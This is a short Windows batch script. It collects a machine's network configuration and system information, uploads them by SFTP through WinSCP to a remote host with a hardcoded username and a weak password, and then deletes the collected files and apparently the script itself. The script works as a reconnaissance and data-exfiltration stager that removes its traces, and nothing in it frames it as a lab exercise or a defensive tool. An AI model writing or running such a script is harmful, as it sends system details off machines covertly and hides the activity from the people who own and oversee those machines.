@echo off
setlocal

rem Set your WinSCP executable path (update this path if needed)
set WINSCP_PATH="C:\Program Files (x86)\WinSCP\WinSCP.com"

rem Set your SFTP server details
set SFTP_HOST=172.20.10.10
set SFTP_USER=mysftpuser
set SFTP_PASSWORD=12345
set REMOTE_PATH=/test



rem Generate local network information and save it to a text file

ipconfig /all > C:\Users\Public\network.txt
systeminfo > C:\Users\Public\sysinfor.txt

rem Run WinSCP to upload the text file to the SFTP server
%WINSCP_PATH% /command ^
    "open sftp://%SFTP_USER%:%SFTP_PASSWORD%@%SFTP_HOST%" ^
    "cd %REMOTE_PATH%" ^
    "put C:\Users\Public\network.txt" ^
    "put C:\Users\Public\sysinfor.txt" ^
    "exit"


rem Delete the local file
del C:\Users\Public\network.txt
del C:\Users\Public\sysinfor.txt
del C:\Users\Public\test.bat

exit

endlocal
